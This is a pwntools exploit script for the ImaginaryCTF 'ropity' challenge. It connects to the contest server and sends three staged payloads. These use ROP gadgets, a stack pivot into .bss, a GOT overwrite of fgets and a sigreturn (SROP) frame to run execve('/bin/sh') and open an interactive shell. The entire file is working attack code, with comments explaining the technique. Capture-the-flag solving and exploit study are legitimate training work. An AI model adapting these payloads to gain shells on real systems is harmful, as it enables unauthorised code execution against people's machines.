from pwn import *
import sys

#Cre: vilex1337

_path = "./vuln"
exe = ELF(_path)
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
add = 'ropity.chal.imaginaryctf.org'
port = 1337
cmd = '''
    b *main + 38
    continue
'''

_option = {'run' : process(_path),
           'exp' : remote(add, port)}

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    return _option[sys.argv[1]]

def p(_data):
    return p64(_data, endian = 'little')

chall = conn()

def check():
    chall.interactive()
    exit()

context.arch = "amd64"

def main():
    _fgets_got = 0x404018
    _endbr64 = 0x401080
    _main = 0x401136
    _syscall = 0x401198
    _bss = 0x404808
    _leave_ret = 0x40115b
    _pop_rbp = 0x40111d
    #This challenge is the same as ropity, but it's target is get the shell.
    #My idea is that use syscall in this challenge, so after setup rax, rdi, i could able to srop through syscall.
    #Then, get the shell
    payload = b'0' * 8 + p(_bss + 0x18) + p(_endbr64) + p(_main + 12)
    sleep(1)
    chall.sendline(payload)
    
    payload = p(0xf + 8) + p(_fgets_got - 0x10) + p(_main + 12)
    payload += b'/bin/sh\x00'
    payload += p(_syscall)
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = _bss + 0x28
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = _syscall
    payload += bytes(frame)[:198]
    sleep(1)
    chall.sendline(payload)

    payload = p(0) + p(0xf + 8) + p(_main + 12) + p(_pop_rbp) + p(_bss + 0x28) + p(_leave_ret)
    sleep(1)
    chall.sendline(payload)
    chall.interactive()


if __name__ == "__main__":
    main()
